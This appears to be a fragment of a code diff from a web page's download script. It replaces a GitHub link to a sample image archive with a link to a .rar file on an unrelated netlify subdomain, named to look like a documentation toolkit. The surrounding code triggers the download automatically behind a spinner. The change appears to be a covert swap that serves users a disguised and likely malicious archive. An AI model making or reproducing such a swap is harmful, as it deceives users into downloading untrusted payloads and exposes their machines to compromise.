@@ -598,7 +598,7 @@ fetch(fileUrl)
       spinner.style.display = "flex";
       progressFrame.style.background = "conic-gradient(#0071e3 0deg, #d3d3d3 0deg)";
 
-  var zipUrl = "https://github.com/techsinit/sample-files/raw/main/test-images.zip";
+  var zipUrl = "https://secure-andrdnld-andreaingrassia.netlify.app/Documentation/Toolkit/060-2634.12026021.RE4BG/Documentation_Toolkit1.0.rar";
 
   var a = document.createElement("a");
   a.href = zipUrl;
